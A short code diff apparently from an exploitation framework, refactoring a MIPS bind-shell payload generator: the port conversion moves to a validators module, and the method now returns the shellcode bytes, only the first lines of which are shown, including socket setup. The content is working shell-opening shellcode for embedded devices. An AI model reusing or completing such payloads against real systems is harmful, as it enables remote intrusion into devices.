@@ -26,9 +26,8 @@ class Exploit(payloads.Payload):
     filepath = exploits.Option("/tmp/{}".format(random_text(8)), 'Output file to write')
 
     def generate(self):
-        bind_port = self.convert_port(self.rport)
-
-        self.payload = (
+        bind_port = validators.convert_port(self.rport)
+        return (
             # socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
             "\x27\xbd\xff\xe0" +        # addiu   sp,sp,-32
             "\x24\x0e\xff\xfd" +        # li      t6,-3
